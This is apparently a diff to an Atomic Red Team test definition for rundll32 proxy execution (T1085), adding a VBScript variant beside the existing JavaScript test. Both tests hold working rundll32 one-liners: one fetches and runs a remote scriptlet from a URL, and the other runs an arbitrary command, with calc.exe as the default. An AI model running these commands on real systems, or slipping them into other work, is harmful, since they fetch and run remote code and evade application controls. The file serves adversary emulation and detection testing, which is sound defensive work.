@@ -14,5 +14,24 @@ atomic_tests:
       default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct
   executor:
     name: command_prompt
+    elevation_required: false
     command: |
       rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();"
+
+- name: Rundll32 execute VBscript command
+  description: |
+    Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
+
+    Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
+  supported_platforms:
+    - windows
+  input_arguments:
+    command_to_execute:
+      description: Command for rundll32.exe to execute
+      type: string
+      default: calc.exe
+  executor:
+    name: command_prompt
+    elevation_required: false
+    command: |
+      rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
